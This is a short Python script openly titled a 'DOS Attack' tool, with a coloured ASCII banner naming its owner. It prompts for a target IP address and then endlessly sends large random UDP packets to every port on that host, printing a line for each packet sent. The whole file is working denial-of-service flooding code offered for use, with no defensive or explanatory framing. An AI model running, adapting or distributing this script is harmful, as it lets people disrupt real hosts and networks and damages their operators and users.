import socket
import os
import random
import time

B = '\033[1m'
R = '\033[31m'
N = '\033[0m'
y="\033[1;33m"
g="\033[1;32m"
white = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(3500)

os.system("clear")


print("""   \033[1;36m

________                    _____   __    __                 __    
╲______ ╲   ____  ______   ╱  _  ╲_╱  │__╱  │______    ____ │  │ __
 │    │  ╲ ╱  _ ╲╱  ___╱  ╱  ╱_╲  ╲   __╲   __╲__  ╲ _╱ ___╲│  │╱ ╱
 │    `   (  <_> )___ ╲  ╱    │    ╲  │  │  │  ╱ __ ╲╲  ╲___│    < 
╱_______  ╱╲____╱____  > ╲____│__  ╱__│  │__│ (____  ╱╲___  >__│_ ╲
        ╲╱           ╲╱          ╲╱                ╲╱     ╲╱     ╲╱
                                      
                                      
\033[1;42m\033[1;37m            WELCOME TO DOS ATTACK          
\033[;0m\033[1;91m\033[1;92m

\033[1;31m••••••••••••••••••••••••••••••••••••••••••••••••••
\033[1;33m••••••••••••••••••••••••••••••••••••••••••••••••••

\033[1;32m [🔶] TOOL      \033[1;33m      : \033[1;96mDOS Attack
\033[1;32m [🔶] TOOL OWNER      \033[1;33m: \033[1;96mJahid Ahmed

\033[1;33m••••••••••••••••••••••••••••••••••••••••••••••••••
\033[1;31m••••••••••••••••••••••••••••••••••••••••••••••••••

""")

ip = input(g+" Enter IP Address   : \033[31m ")
os.system("clear")
print(y+" Starting Attack With DOS Tool .......")
time.sleep(3)
while True:
    sent = 0
    for port in range(1, 65534):
        white.sendto(bytes, (ip, port))
        sent = sent + 1
        print("\033[1;91mSend \033[1;32m%s \033[1;36m Packets to \033[1;33m%s \033[1;35mThrough port \033[1;32m%s " % (sent, ip, port))

print("\033[1;92m DOS Attack finished✅ \033[0m")
